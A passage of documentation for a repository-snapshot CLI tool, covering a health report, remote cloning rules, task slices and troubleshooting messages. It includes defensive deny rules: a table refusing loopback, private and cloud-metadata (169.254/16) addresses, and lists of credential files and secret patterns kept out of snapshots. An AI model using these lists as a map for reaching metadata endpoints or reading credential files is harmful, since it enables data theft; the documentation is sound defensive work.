   13 passed, 0 warning(s), 0 failed, 0 skipped
```

A **failed** check (critical) means the snapshot is not safe to hand to a model as it stands; the
command exits 1, or 2 with `--strict`. A **warning** is a judgement call: a host path is not a
secret, but you may not want it in the payload either.

The score starts at 100; each failure costs 25 and each warning 5, with a floor of zero. It is a
summary, not a substitute for the checks — the report always lists every one.

## What it never does

- It does not regenerate, repair or delete anything. The report is evidence; evidence that mutates
  is not evidence.
- It never prints a secret it found. Findings name the artifact and the line count, never the value.
- It does not need the network. Everything it compares is on disk.

## In the MCP server

`snapshot_health` returns the same report as structured output, so an agent can call it before
trusting a snapshot it was handed:

```json
{ "score": 95, "counts": { "pass": 12, "warn": 1, "fail": 0, "skip": 0 }, "checks": [ … ] }
```

The cheap subset — manifest, parts, artifacts, skips — also runs inside `validate`, so a normal
drift check catches structural dishonesty without paying for the leak scan on every CI run.
</file>

<file path="docs/remote.md">
# Remote repositories

```bash
npx -y codebase-snapshot generate --remote https://github.com/owner/repo
npx -y codebase-snapshot generate --remote https://github.com/owner/repo --ref v2.1.0
GITHUB_TOKEN=... npx -y codebase-snapshot generate --remote https://github.com/owner/private
```

The snapshot is written where you ran the command, not inside the clone. The manifest records where
the tree came from:

```json
"source": {
  "url": "https://github.com/owner/repo",
  "host": "github.com",
  "owner": "owner",
  "repo": "repo",
  "ref": "main",
  "commit": "9f2c…",
  "fetchedAt": "2026-11-18T04:12:09.144Z"
}
```

The **commit** is the one that was cloned, not the one the URL points at today. A snapshot that names
a moving branch and no commit describes a tree nobody can fetch again; this one can be traced back.

## What it fetches

A shallow clone: `--depth 1`, one branch, no tags, no submodules, no Git LFS. A snapshot needs the
tree a reader would see, not the history. The clone lives in a temporary directory that is removed
when the command exits; `--keep-clone` keeps it and prints the path.

## What it refuses

| Refused | Why |
| :--- | :--- |
| `http://` and other schemes | The URL decides which machine this process talks to. |
| URLs with a username or password | Credentials in a URL end up in argv, shell history and logs. Use `GITHUB_TOKEN`. |
| Loopback, `10/8`, `172.16/12`, `192.168/16`, `169.254/16` (cloud metadata), CGNAT, `fe80::/10`, `fc00::/7` | A repository URL must not become a way to read the local network. |
| A host that resolves to any private address | DNS is checked after the literal check, because `repo.example.com` can point at 127.0.0.1. |
| A clone larger than 1 GB | The scan is text; a checkout that large is not a snapshot anyone reads. |
| `file:` URLs | A local directory is not a remote. `--allow-private` is the explicit override, for air-gapped mirrors and tests. |

`--allow-private` exists because "I know what I am doing" is a real answer. It is not a default.

The same path backs the **browser page**: paste a URL into `serve` and it clones with these rules,
generates into a temporary snapshot, and shows it. The clone is removed when the server exits.

## Private repositories

Set `GITHUB_TOKEN` (or `GH_TOKEN`). The token is passed to git through the environment as an HTTP
header, never on the command line, and it never appears in the manifest, the reports or the brief.
The clone is shallow, so a token with `contents: read` is enough.

## The configuration of a fetched repository is not loaded

A clone may contain `snapshot.config.ts`, and a config can run code. A repository you just fetched
is not a repository you trust, so `--remote` always runs on the defaults — the same rule the MCP
server and the web UI follow. If you want the fetched project's config applied, clone it yourself,
read the config, and run the CLI there.
</file>

<file path="docs/slice.md">
# Task slices

```bash
codebase-snapshot generate --slice "how does checkout retry a failed payment" --slice-tokens 20000
```

A slice is a snapshot built for a question. The retrieval planner that powers
[`snapshot_plan_for`](mcp.md) runs at generate time, and only the files it chooses are written. The
result is a snapshot small enough to paste, with the selection and the omissions recorded.

## What it keeps

The planner ranks every scanned file by:

1. path terms — `checkout` matches `src/checkout.ts` and `checkout.test.ts`;
2. symbol names from the parsed summary — `charge` matches `chargeCard`, `authenticated` matches `auth`;
3. layer and kind names named in the question;
4. how many files import it (centrality);
5. the imports of the strongest matches, pulled in as context.

Tests are excluded unless the question names them. Then files are packed in rank order until the
budget is reached; a file too large for what remains is offered as a head read, and a file that
still does not fit is skipped with a reason.

## What it records

```json
"slice": {
  "question": "how does checkout retry a failed payment",
  "budgetTokens": 20000,
  "usedTokens": 18422,
  "files": ["src/checkout.ts", "src/payments/retry.ts", "..."],
  "dropped": 1431
}
```

Every path that was scanned and not chosen is in `skipped[]` with reason `not-selected` — not
`unchanged`, which would be a different and untrue statement. The brief says at the top that the
snapshot is a slice, quotes the question, and warns that unselected paths are not in the parts.

## What it does not do

- It does not read files that were excluded: sensitive files stay out, so a question about them
  cannot make them selected.
- It does not promise the answer is complete. A slice is a budgeted guess at what a reader needs,
  and the brief says so.
- It does not combine with `--delta` or `--budget-tokens`; all three narrow the selection and the
  CLI refuses a pair rather than guessing which should win. Use `--slice-tokens` for the slice's own
  budget.

## When to use it

| Situation | Use |
| :--- | :--- |
| A focused question about one subsystem | `--slice` |
| A review of a change set | `--delta` |
| The whole repository for an audit | neither |
</file>

<file path="docs/troubleshooting.md">
# Troubleshooting

Every message below is the real text the tool prints. Find your symptom, then the cause and
the fix.

## The command does nothing

**Symptom** — `npx codebase-snapshot generate` exits `0` and prints nothing. No
`snapshot/` directory appears.

**Cause** — a **stale global install** is shadowing `npx`. When a global copy exists, npm
runs it instead of the published package, and a leftover `npm link` (pointing at a
development checkout) resolves to a binary that is not there.

**Fix**

```bash
npm ls -g --depth=0 | grep codebase-snapshot
npm rm -g codebase-snapshot
npx codebase-snapshot generate
```

If nothing is installed globally, clear the npx cache (`npm cache clean --force`) and retry.
This is a local environment problem, not a package problem: on a machine without a global
copy the same command works.

## `command not found`

**Cause** — when the package is installed as a project dependency, its binary lives in
`node_modules/.bin` and is only on `PATH` inside a client runner or a package script.

**Fix** — use `npx codebase-snapshot`, `pnpm exec codebase-snapshot`,
`yarn codebase-snapshot`, `bun run codebase-snapshot`, or `./node_modules/.bin/codebase-snapshot`
in scripts.

## Exit code 2 — the command itself was wrong

Exit `2` always means "retrying this unchanged will fail the same way". The message names the
problem, and for an option the command does not take it also names the commands that do:

```
❌ --watch does not apply to `report` and was not applied. It is accepted by: `generate`.
❌ --cwd does not apply to `describe` and was not applied. It is accepted by: `generate`, `validate`, `report`, `explain`, `init`, `setup`, `skill`, `mcp`.
❌ --max-part-bytes does not apply to `report` and was not applied. It is accepted by: `generate`, `validate`, `explain`, `init`, `setup`.
❌ Unknown --mode "bogus". Expected one of: generate, validate, check, report, init, setup, explain, diff, describe, skill, mcp.
```

Nothing is silently ignored — that is the point of the message. The per-option `Applies to`
column is in the [CLI reference](cli.md#options).

`report` takes no generation settings: it reads the manifest and prints it, so for example
`--max-part-bytes`, `--large-file-bytes`, `--max-monolith-bytes`, `--include-monolith`,
`--include-sensitive-files`, `--skip-artifacts` and `--only-artifacts` are all usage errors
there, as are `--skeleton`, `--sarif` and `--max-part-tokens`. `--mode` names the same commands from the other side, `mcp` included, and
`--mode explain <path>` / `--mode diff <a> <b>` take their positionals like the command does.

| Message | Fix |
| :--- | :--- |
| `Unknown command "frobnicate". Expected one of: …` | Use one of the commands in the [CLI reference](cli.md). |
| `No configuration found in … and this session is not interactive, so nothing was generated.` | A first run and no terminal to ask its question. Nothing is wrong with the repository: say which setup you want — `--autopilot` for the full setup, `init --yes` then `generate` for the steps, or `generate` for the documented defaults. See [the first run](cli.md#the-first-run). |
| `--autopilot sets a project up and writes a config; --no-config ignores config files. Pass one or the other.` | The two flags contradict each other. Drop one. |
| `--no-install only applies to \`setup\`, or to \`generate --autopilot\`.` | The install only happens during a setup. Drop the flag, or add `--autopilot`. |
| `--preset does not apply to \`generate\` and was not applied. It is accepted by: \`init\`, \`setup\`. To scope a run, set include/excludePatterns/preset in snapshot.config.ts (or run \`codebase-snapshot init\` to generate one).` | `--preset`, `--include`, `--exclude`, `--yes` and `--force` configure `init` and `setup`, which write them into the config. Set them at generation time in `snapshot.config.ts` instead. |
| `--skip-artifacts does not apply to \`report\` and was not applied. It is accepted by: \`generate\`, \`validate\`, \`explain\`, \`init\`, \`setup\`.` | `report` reads the manifest and prints it, so the generation settings are rejected there. Run `generate` with the artifact selection you want. |
| `Unknown --mode "bogus". Expected one of: generate, validate, check, report, init, setup, explain, diff, describe, skill, mcp.` | `--mode` names the command the run uses; `mcp` is one of the accepted names. Pass the command positionally unless a wrapper builds the argument list. |
| `--install does not apply to \`generate\` and was not applied. It is accepted by: \`skill\`.` | `--install` and `--target` configure `skill` only. |
| `--cwd directory does not exist: …` / `--cwd is not a directory: …` | Point `--cwd` at an existing repository directory. |
| `--out-dir requires a value (received an empty string).` | An unset shell variable expanded to nothing. Quote it or drop the flag. Every string option rejects `""` rather than silently using the default. |
| `--max-part-bytes received a value that looks like another flag (for example a negative number). Use the "--option=value" form, and note that sizes must be positive.` | A negative number reads as a flag. Use `--max-part-bytes=-5`, and note that sizes must be positive. |
| `Unknown preset "nope". Expected one of: …` | The message lists all 25 valid names. |
| `--target must be one of: claude, cursor, all (received "bogus").` | Fix the value. |
| `diff expects exactly two arguments …` / `explain expects exactly one path.` | Fix the arity. |

The `agents` target was removed in 4.1.1: `skill --install` writes only into the two registries
agent tools read by name (`.claude/skills/` and `.cursor/rules/`) and never writes `AGENTS.md`,
which is your repository's own agent contract. To put the skill there, print it and paste it
yourself: `codebase-snapshot skill >> AGENTS.md`.

## Exit code 1 — the state was wrong

### `Refusing to replace outDir …`

```
❌ Failed to generate snapshot: Refusing to replace outDir /repo/src: it holds no .codebase-snapshot marker (found app.ts). Remove the directory yourself, or point outDir at a new or empty directory.
```

**Cause** — the output directory contains files this tool did not write, and it cannot prove
it wrote them. This guard exists because a mistyped `outDir` used to replace the directory:
`outDir: "src"` deleted source code while reporting success.

Ownership is proved by a `.codebase-snapshot` marker that parses as ours — a JSON object
naming this generator, carrying a schema version this build understands, a per-snapshot `id`,
the digest of the manifest it shipped and, in current markers, the size and sha256 of every file
it wrote. A file with the right name is not enough:

| The directory | What the tool says |
| :--- | :--- |
| has files, no marker | `it holds no .codebase-snapshot marker (found app.ts)` |
| has a zero-byte marker | `its .codebase-snapshot marker is empty (found .codebase-snapshot, app.ts)` |
| has a marker that is not JSON | `its .codebase-snapshot marker is not valid JSON (found .codebase-snapshot, app.ts)` |
| was written by 3.0.0 | `its .codebase-snapshot marker carries no snapshot id (found .codebase-snapshot, manifest.json)` |
| carries our marker but you added files | `it carries this generator's ownership marker, but these entries are not part of the snapshot it recorded: custom.txt. Remove them yourself, or point outDir at a new or empty directory.` |
| has a marker whose recorded per-file digests no longer match the directory | `its .codebase-snapshot inventory's digest for parts/part-001.md does not match the file (found .codebase-snapshot, manifest.json, parts, reports, README.md)`, or `its .codebase-snapshot inventory records notes.txt as 12 B, but it is 20 B` |
| is a real snapshot and you edited a part by hand | the same digest refusal: the run stops before writing, so the edited snapshot is **not** overwritten. Delete the directory and generate again. |
| has a marker that records neither per-file digests nor a manifest digest | `its .codebase-snapshot marker records neither per-file digests nor a manifest digest, so it cannot prove this generator wrote the directory (found .codebase-snapshot, notes.txt)` |

Two evidence shapes are accepted. A marker with a per-file inventory is checked file by file:
every regular file's byte length and sha256 must match, every recorded path must still exist, and
every entry in the directory must be one the run recorded. A **legacy** marker (written before
that inventory existed) is accepted on its `manifestSha256` when `manifest.json` is present and
the digest matches — the upgrade path, so a snapshot from an earlier release stays replaceable. A
legacy snapshot generated with the manifest artifact disabled cannot prove itself and is refused
once; delete it and generate again.

**Fix** — point `--out-dir` somewhere new, or delete the directory yourself. Do not delete
your source. Accepted without complaint: a missing directory, an empty directory, one holding
nothing but `.DS_Store`, and a complete snapshot whose marker evidence still matches.

`.gitkeep` and `.gitignore` are **not** accepted, even in a directory that holds nothing else.
Both are files you create — the generator never writes either into an output directory — so a
directory holding one is somebody's data and is refused rather than replaced. Move the file out,
or point `--out-dir` somewhere new.

A snapshot written by 3.0.0 or earlier is **not** upgraded in place: its marker has three keys
and no `id`, so this build cannot prove it wrote the directory and refuses. Delete the old
snapshot directory and generate again.

### `Refusing to write into outDir …: it exists but is not a directory.`

```
❌ Failed to generate snapshot: Refusing to write into outDir /repo/notes.txt: it exists but is not a directory.
```

A regular file has the same name as the output directory. Rename or remove it.

### `The config file could not be read`

```
⚠ Config: Could not parse /repo/snapshot.config.json: Expected property name or '}' …
❌ The config file could not be read. Fix it, or delete it to use the defaults.
```

**Cause** — a config file exists but does not parse, or a `.ts` config cannot be loaded. This
is fatal on purpose: skipping a broken config would generate a snapshot with none of your
settings and still report success.

**Fix** — fix the syntax, or delete the file to run on defaults. Check that the config is
loadable on your Node version: a `.ts` config needs Node ≥ 22.6 **and** an ES-module project.
`codebase-snapshot init` picks the right filename for the project automatically.

### `This directory is a git repository, but git could not list its files.`

```
❌ Failed to generate snapshot: This directory is a git repository, but git could not list its files. A plain walk honours .gitignore files, but git also applies .git/info/exclude and your global excludes file, includes files that are tracked although a .gitignore now matches them, and treats a submodule as a single entry. Fix the repository (git status should work), run outside git, or pass --discovery walk to accept those differences.
```

`git` is present and a `.git` directory exists, but it cannot list the files — an empty or
half-initialised `.git`, a permissions problem, or a damaged index. The tool refuses rather
than silently choosing between two discovery methods: which files are in the snapshot would
otherwise depend on whether git happened to work.

**Fix** — make `git status` work in that directory (repair or re-clone the repository), generate
from a copy that has no `.git` directory, or pass `--discovery walk` to scan the tree anyway.
The walk reads every `.gitignore` it meets, nested ones included, and still skips credential
files; what it cannot reproduce is git's own ignore sources (`.git/info/exclude` and your global
`core.excludesFile`), git's inclusion of files that are tracked although a `.gitignore` now
matches them, and its treatment of a submodule as one entry instead of a tree.

`--discovery git` says the opposite — require git — so it refuses in a directory that has no
usable repository:

```
❌ Failed to generate snapshot: Discovery mode is `git`, but git could not list this directory's files. Run inside a working repository, or pass --discovery walk (or auto) to scan the tree directly.
```

### `Another generate run is already using the staging directory …`

```
❌ Failed to generate snapshot: Another generate run is already using the staging directory /repo/snapshot.tmp. Wait for it to finish, or delete /repo/codebase-snapshot-1a2b3c4d5e6f7890.lock if no other run is active.
```

A second `generate` against the same repository started while the first still held the staging
directory — two terminals, or a CI job and a developer at once. The lock is advisory and on
disk, so a run that was killed cannot release it.

**Fix** — wait for the other run, then retry. If no other run is active, the named lock file is
stale: delete it, and the next run proceeds.

### `Refusing to generate: …`

```
❌ Failed to generate snapshot: Refusing to generate: outDir is the working directory or one of its ancestors. outDir=/repo tmpDir=/repo/snapshot.tmp cwd=/repo
```

The output paths are unsafe: `outDir` or `tmpDir` is the working directory, an ancestor, the
filesystem root, or they contain one another. The message prints the resolved paths so you
can see why. Use a subdirectory.

### `Nothing to snapshot: … has no files.`

```
❌ Nothing to snapshot: this directory has no files. Run this inside the repository you want to snapshot, or pass --cwd.
```

The directory is empty apart from `.git` (or `.hg`, `.svn`, `.DS_Store`, `Thumbs.db`). Setting the
project up would install a devDependency and add scripts for a repository with nothing in it, so
`--autopilot` refuses too. Run the command from the repository, or point `--cwd` at it.

### Budget errors

A budget set in a **config file** exits `1`, and names the setting as you wrote it:

| Message | Fix |
| :--- | :--- |
| `maxPartBytes must be a positive byte count (received 0).` | Zero and negative values are errors, not "use the default". |
| `maxPartBytes must be at least 4096 bytes (received 1000).` | Raise it to 4096 or more (`"120k"` is 122880). |
| `maxPartBytes must be a byte count such as 120000, "120k" or "1.5mb" (received "abc").` | The value is not a number or a supported size string. |

The same mistake on the **command line** is a usage error, exits `2`, names the flag, and is
followed by the usage text:

| Message | Fix |
| :--- | :--- |
| `--max-part-bytes must be at least 4096, received "1000".` | Raise it to 4096 or more. `--max-part-bytes 0` and `--max-part-bytes 1000` both produce this form. |
| `--max-part-bytes expects a byte count such as 120000 or "120k", received "abc".` | The value is not a number or a supported size string. `--max-part-bytes=-5` produces this form too. |

`--large-file-bytes` and `--max-monolith-bytes` share the second message, with their own flag
name, and their minimum is 1 rather than 4096:
`--large-file-bytes must be at least 1, received "0".`

### `largeFileBytes (…) is larger than maxPartBytes (…)`

The two ceilings answer one question — *can this file be emitted whole?* — and they disagree.
A part cannot hold more than its budget, so a file between the two numbers cannot fit a part;
it would be cut to fit while the manifest called it a preview by policy. That is exactly the
silent truncation this check exists to prevent, so it is refused **before anything is written**.

Raise `maxPartBytes` to at least `largeFileBytes`, or lower `largeFileBytes`. Leaving
`largeFileBytes` unset is the usual answer: it then follows the budget.

A config written by an older `setup` may set `largeFileBytes: "200k"` beside a smaller budget;
delete that line and it follows the budget again.

### `Cannot write the snapshot: permission denied under …`

The output directory is not writable (or a parent is not readable). The previous snapshot is
left intact. Fix the permissions, or choose another `--out-dir`.

### `EPERM: rename 'snapshot' -> 'snapshot.backup-…'` (Windows, OneDrive)

Something holds a handle *inside* the previous snapshot — a sync client, an antivirus, an
editor with one of those files open — and Windows will not rename a directory while any handle
in it is open. The swap retries for three seconds and then, because the ownership guard has
already proved the directory holds nothing but a snapshot this tool wrote, removes it and
places the new one in the same path. You will see a `could not be moved aside … replaced in
place` note when that happens.

If it still fails, close whatever is holding the old snapshot and run again. The new snapshot
is complete in the staging directory (`snapshot.tmp` by default) and its path is printed.

### `Snapshot validation failed` (from `validate`)

Exit `1` with one line per class of drift:

| Line | Meaning |
| :--- | :--- |
| `- modified: path` | The file changed since the snapshot. |
| `- deleted: path` | The file is in the snapshot but no longer on disk. |
| `- new file: path` | The file exists on disk and is not in the snapshot. |
| `- unreadable: path` | The file exists but this process may not read or stat it — usually a permissions problem. It is not a deleted file. |
| `- part: part-001.md (missing from snapshot/parts)` | The part file was deleted or renamed. |
| `- part: … (size mismatch …)` | The part was edited by hand. |
| `- config: …` | A setting differs from the one recorded in the manifest. |
| `- counts: …` | The manifest's own bookkeeping disagrees with its contents. |

**Fix** — re-run `generate` for drift. For `unreadable`, fix the file's permissions first:
re-generating cannot read it either. If anything persists, the snapshot directory is being
modified by something else.

### `report` exits 1 (only when it cannot read the snapshot)

- `Manifest not found at … Run generate first.` — nothing has been generated yet.
- `… is not a snapshot manifest: missing \`counts\`` — the file parsed as JSON but is not a
  manifest this tool wrote. Wrong `--out-dir`, or a foreign file named `manifest.json`.

### `diff` exits 1

- `No snapshot found at X: the path does not exist.`
- `Could not read a manifest at X.`
- `… is not a snapshot manifest (no "counts" object).`

Point it at a snapshot directory or a `manifest.json` written by this tool.

## A file is missing from the snapshot

Run `explain` on it — it names the exact reason and the rule responsible:

```bash
npx codebase-snapshot explain src/generated/schema.ts
```

`manifest.json` records the same for every file in `skipped[]`:

| `reason` | Meaning | Fix |
| :--- | :--- | :--- |
| `sensitive-file` | `.env`, `*.pem`, `.npmrc`, `.ssh/`, `.tfstate`, … | `--include-sensitive-files` if you really want it. |
| `sensitive-path` | The path itself matched a secret rule, so the file is skipped and its path is masked in every artifact. | Rename the file; a path that looks like a key is treated as one. |
| `binary` | Not text: it contains a NUL byte outside a UTF-16 stream, or is more than 1% control characters. The `detail` names the file size and the reason — including the offset of the first NUL when that byte sits past the 8 MB head scan. | Nothing to do. A UTF-16 file is *not* binary — it is transcoded and reported with `encoding`, not skipped. |
| `default-ignore` | A built-in rule, the preset's ecosystem ignores (`node_modules`, `__pycache__`, `target`, `vendor`, …), or the output directory. | A preset's ignores are not configurable; a custom `excludePatterns` can only remove more. |
| `excluded` | Your own `excludePatterns`, or a path outside a non-empty `include` allow-list. | Remove the pattern, or widen `include`. |
| `symlink` | Links are not followed (a directory link names its target in `detail`). | Snapshot the target. |
| `outside-root` | A link whose target resolves outside the scanned root. | Keep the target inside the repository, or snapshot it directly. |
| `gitignore` | A `.gitignore` excluded it, in a scan that is not reading git's index. | Remove the entry, or add the path to `include`. |
| `read-error` | Unreadable file. | Check permissions. |
| `not-file` | A directory, socket, FIFO. | Expected. |
| `nested-repository` | A nested checkout or submodule — a directory tracked by a different repository. | Expected; snapshot that repository separately if you need its code. |

Inside a git repository the candidate list comes from git, which applies `.gitignore` before
the scanner runs; those ignored paths are listed separately and recorded too, so a `.gitignore`d
file or directory appears here with reason `gitignore` in either mode.

A skipped directory is recorded, but the files inside it are never descended to and so have no
record of their own. For those, `explain` reports the **nearest skipped ancestor** and names it
in `detail`, whatever the reason — including built-in ignores:

```
node_modules/dep/index.js
  included   no
  reason     default-ignore
  detail     built-in ignore: directory "node_modules" (not descended) — inherited from the skipped directory `node_modules`
```

The same applies to a `.gitignore`d tree, where `detail` reads
``ignored by .gitignore — inherited from the skipped directory `ignored` ``.

`explain` can report two more, which never appear in `skipped[]` because they are about the
path rather than about a candidate file:

| `reason` | Meaning | Fix |
| :--- | :--- | :--- |
| `missing` | `no such file or directory, relative to the configured cwd` — nothing is at that path. | Check the path and `--cwd`. |
| `not-discovered` | `exists but is not tracked or is otherwise not a candidate` — the path exists but nothing accounts for it: no rule, glob or skipped ancestor explains it. The tool's own output directory is pruned this way, so a file under `snapshot/` reports it. | If it sits in a skipped directory you will normally get that directory's reason instead; otherwise copy it into the repository, since `include` cannot rescue a pruned directory. |

Also check `include`: if it is non-empty it acts as an allow-list, and everything else is
excluded.

## The snapshot is too big

- Lower the budget: `--max-part-bytes 120k`.
- Exclude whole trees: `excludePatterns: ["vendor/**", "**/*.min.js"]` in the config.
- Per-layer budgets: `budgets: { default: "120k", byLayer: { docs: 40000 } }`.
- Skip artifacts you do not read: `--skip-artifacts navigation,projectTree,audit`.
- Large files are already previewed rather than inlined; tune with `--large-file-bytes`.

## Warnings that are working as intended

These come from `generate`. They are recorded in `manifest.warnings` and repeated on stderr
under a `- Warnings: N` line in the summary, and none of them stops a run:

- `manifest.json is disabled: \`validate\` and \`report\` cannot inspect this snapshot.` — you
  used `--skip-artifacts manifest`.
- `parts are disabled but navigation.md is enabled: its links point at part files that were not written.`
- `every artifact is disabled: only the .codebase-snapshot ownership marker will be written.`
- A `hooks.afterGenerate` error is downgraded to a warning: the snapshot it was called for is
  already written and is not lost.
- `N file(s) exceed 2 MB and were not parsed for a structural summary: …` — the named files are
  emitted as head/tail previews without an `imports`/`exports` summary. Parsing them costs several
  times their own size in memory, which is how a single 50 MB source file used to reach 3.3 GB of
  resident memory. Nothing to fix; raise the part budget if the preview is too small.
- `N file(s) are UTF-16LE and were transcoded to UTF-8: …` — those files were UTF-16 and are
  now ordinary text in the snapshot. They are listed in `manifest.files[]` with
  `encoding: "utf-16le"`, or `"utf-16be"`. Nothing to fix; the warning exists because the bytes
  in the artifact are not the bytes on disk.
- `N file(s) are not valid UTF-8; M undecodable byte(s) became U+FFFD: …` — the named files are
  not UTF-8 at all (Latin-1 is the usual cause). They are kept, with `encoding: "utf-8-lossy"`,
  but the undecodable spans are substituted, so **do not hand the emitted body to a model as if
  it were the source**. Convert the file to UTF-8 (`iconv -f WINDOWS-1252 -t UTF-8 file > file.tmp`)
  and regenerate. The snapshot still validates as current, because the hash covers the raw bytes.

## Redactions in the summary are not warnings

If your run printed something like

```
   - Warnings:      0
   - Redacted:      78 line(s) — values masked; see snapshot/reports/audit.md
```

then nothing is wrong. That line counts **lines whose values were masked**, once per line even
when two rules matched the same line, and the per-line detail — file, line, every rule that
fired — is the table in `reports/audit.md` (section 1). The same number is
`manifest.totals.redactedLines`.

Three things surprise people about it, and all three are the intended trade-off:

- **`.env.example` and docs templates are masked too.** A placeholder such as
  `JWT_SECRET=replace-with-base64url-48-bytes` is masked exactly like a live key, because the
  rule cannot tell them apart — guessing which values are throwaway is how a real key escapes.
  The template is therefore less readable in the snapshot than on disk. Narrow it with
  `customPatterns` and `disableDefaultPatterns` (see
  [Configuration](configuration.md#secrets-redaction)).
- **Test fixtures count.** `process.env.DB_SECRET = "test-value"` is a credential assignment by
  shape, so it is masked and counted.
- **A long list is not a truncated list.** The `Warnings:` preview stops at ten rows and prints
  `… and N more in manifest.warnings[]`; redactions are never previewed in the summary at all —
  the count is stated and the table is the list.

If `reports/audit.md` was disabled with `--skip-artifacts audit`, the manifest keeps the count and
warns that the per-line detail was not written, rather than dropping it silently.

`validate` produces its own warnings, printed with a `⚠ ` prefix and never written to the
manifest, because they describe the state of the repository rather than the snapshot:

- `⚠ Working tree has uncommitted changes.`
- `⚠ Snapshot was generated on branch "zeta" but the configured branch is "main".` — the
  branch moved since the snapshot was written.

## Detached HEAD

On a detached HEAD (normal in CI) `manifest.git.branch` records the configured branch —
`main` by default — because a detached HEAD cannot name one. Set `branch` in the config if
your CI convention differs. This is not a warning condition.

## Not a git repository

Outside a repository the tool does not fail; it records what it can:

```json
{ "branch": "main", "commit": "unknown", "isDirty": false }
```

`branch` is the configured branch, `commit` is `"unknown"`, and `isDirty` is `false` because
there is no tree to compare — not because the tree is clean. Read `commit` when you need to
tell "no repository" from "clean repository", and do not treat `isDirty: false` alone as
evidence that the snapshot was taken from committed state.

## Still stuck

```bash
npx codebase-snapshot describe --format json > contract.json
npx codebase-snapshot generate --dry-run --format json > dry-run.json
```

The first is the machine-readable contract, including a troubleshooting table. The second
computes a full snapshot without writing anything, so you can inspect
`config`, `counts`, `skipped` and `warnings` before committing to a run.
</file>

